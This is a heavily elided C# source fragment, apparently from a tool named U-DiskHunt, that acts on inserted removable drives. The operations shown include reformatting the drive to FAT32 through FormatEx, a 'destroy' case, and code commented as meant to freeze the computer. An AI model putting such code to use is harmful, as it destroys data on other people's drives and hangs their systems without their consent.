						...
						if (drive.DriveType == DriveType.Removable)
						{
							switch (op)
							{
								case "copy":
									...
									break;
								case "format": 
									FormatEx(drive.Name + "\0", FMIFS_HARDDISK, "FAT32", null, false, 0, (int command, int modifier, IntPtr argument)=>
									{switch (command)
										{
											case 11:
												break;
								...
								case "readonly":
									...
									break;
								case "kasi":
									StringBuilder i = new StringBuilder(0, int.MaxValue);
								...
								case "mousetrail":
									string pvParam = "";
									SystemParametersInfo(SPI_SETMOUSETRAILS, 15, ref pvParam, 0); //不要改最后一个参数,不然无法卡死
									break;
								case "destroy":
...
#pragma warning restore CS0168 // 声明了变量，但从未使用过
		...
		{
			Process.Start("https://github.com/ISDHN/U-DiskHunt");
		}
